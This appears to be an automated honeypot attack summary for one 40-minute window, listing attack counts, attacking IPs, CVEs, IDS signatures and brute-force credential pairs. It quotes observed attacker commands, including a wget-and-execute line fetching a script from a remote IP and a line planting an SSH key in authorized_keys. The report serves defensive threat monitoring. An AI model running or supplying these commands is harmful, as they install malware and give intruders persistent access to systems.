Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-03T17:01:32Z
**Timeframe:** 2025-10-03T16:20:01Z to 2025-10-03T17:00:01Z
**Files Used:**
- agg_log_20251003T162001Z.json
- agg_log_20251003T164001Z.json
- agg_log_20251003T170001Z.json

**Executive Summary**
This report summarizes 13,523 attacks recorded by our honeypot network over a period of 40 minutes. The majority of attacks were directed at the Cowrie, Suricata, and Ciscoasa honeypots. The most targeted service was SMB on port 445, followed by SSH on port 22. A significant number of attacks originated from IP address 129.212.180.254. Attackers were observed attempting to exploit several vulnerabilities, including DoublePulsar, and executed a variety of commands for reconnaissance and to establish persistence.

**Detailed Analysis**

***Attacks by Honeypot***
- Cowrie: 5,873
- Suricata: 2,517
- Ciscoasa: 1,966
- Dionaea: 1,653
- Mailoney: 842
- Sentrypeer: 286
- Honeytrap: 130
- Tanner: 107
- H0neytr4p: 34
- Adbhoney: 31
- Redishoneypot: 31
- Honeyaml: 25
- ElasticPot: 10
- ConPot: 9
- Dicompot: 6
- Ipphoney: 3

***Top Attacking IPs***
- 129.212.180.254
- 103.36.121.30
- 89.254.211.131
- 176.65.141.117
- 38.34.18.221
- 171.243.148.107
- 116.99.170.83
- 134.209.163.182
- 173.212.228.191
- 51.83.134.64

***Top Targeted Ports/Protocols***
- 445/TCP (SMB)
- 22/TCP (SSH)
- 25/TCP (SMTP)
- 5060/UDP (SIP)
- 80/TCP (HTTP)
- 23/TCP (Telnet)

***Most Common CVEs***
- CVE-2002-0013, CVE-2002-0012
- CVE-2002-0013, CVE-2002-0012, CVE-1999-0517
- CVE-2019-11500
- CVE-2021-3449
- CVE-2021-41773
- CVE-2021-42013
- CVE-2024-4577, CVE-2002-0953
- CVE-2024-4577

***Commands Attempted by Attackers***
- Basic reconnaissance: `uname -a`, `whoami`, `w`, `cat /proc/cpuinfo`, `free -m`, `lscpu`, `df -h`
- Persistence: `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- Filesystem manipulation: `chattr -ia .ssh`, `lockr -ia .ssh`
- Malware download and execution: `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh;`
- Password change attempt: `Enter new UNIX password:`

***Signatures Triggered***
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Potential SSH Scan
- ET INFO Reserved Internal IP Traffic
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- ET DROP Spamhaus DROP Listed Traffic Inbound
- ET CINS Active Threat Intelligence Poor Reputation IP

***Users / Login Attempts (Sample)***
- root/2glehe5t24th1issZs
- root/LeitboGi0ro
- 345gs5662d34/345gs5662d34
- superadmin/admin123
- ubnt/ubnt
- root/root123
- root/nPSpP4PBW0
- mysql/mysql
- ftp/ftp
- support/support

***Files Uploaded/Downloaded***
- wget.sh
- w.sh
- c.sh
- setup.sh
- 11
- fonts.gstatic.com
- various css and js files

***HTTP User-Agents***
- No significant user agents recorded.

***SSH Clients and Servers***
- No specific SSH clients or servers were identified in the logs.

***Top Attacker AS Organizations***
- No AS organization data was available in the provided logs.

**Key Observations and Anomalies**
- **High Volume of SMB Traffic:** The significant number of attacks targeting port 445, along with the "DoublePulsar Backdoor" signature, strongly suggests automated campaigns to exploit SMB vulnerabilities, likely related to the EternalBlue family of exploits.
- **Persistent SSH Attacks:** Attackers are not only attempting to brute-force SSH credentials but are also actively trying to install their own SSH keys for persistent access. This indicates a more advanced attacker goal beyond simple reconnaissance.
- **Automated Script Execution:** The commands show a clear pattern of downloading and executing scripts from a remote server (213.209.143.62), a common tactic for deploying malware or adding the compromised machine to a botnet.
- **SMTP Activity Spike:** The Mailoney honeypot recorded a high number of events from a single IP (176.65.141.117), suggesting a targeted attempt to test for open relays or exploit SMTP vulnerabilities.
- **Variety of CVEs:** The logs show attempts to exploit a mix of old and very recent vulnerabilities, indicating that attackers are using a broad set of tools to find any possible entry point.